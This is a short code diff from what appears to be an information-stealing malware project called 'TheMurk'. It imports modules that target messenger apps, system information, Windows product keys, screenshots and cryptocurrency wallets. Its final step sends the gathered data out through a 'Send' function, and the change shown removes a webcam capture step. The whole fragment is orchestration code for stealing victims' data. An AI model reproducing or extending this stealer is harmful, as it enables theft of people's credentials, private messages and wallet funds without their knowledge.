@@ -16,7 +16,7 @@ from targets.messengers.viber import Viber
 from targets.messengers.pidgin import Pidgin
 from targets.system.system_info import SystemInfo
 from targets.system.productkey import ProductKey
-from targets.system.photos import Screenshot, WebCam
+from targets.system.photos import Screenshot
 from targets.wallets.wallets import Wallets
 from manager.send import Send
 from sys import exit,argv
@@ -77,7 +77,6 @@ class TheMurk:
         self.msgInfo[0] = SystemInfo()
         ProductKey()
         Screenshot()
-        WebCam()
     
     def Conclusion(self):
         Send(config.sendData, self.msgInfo)
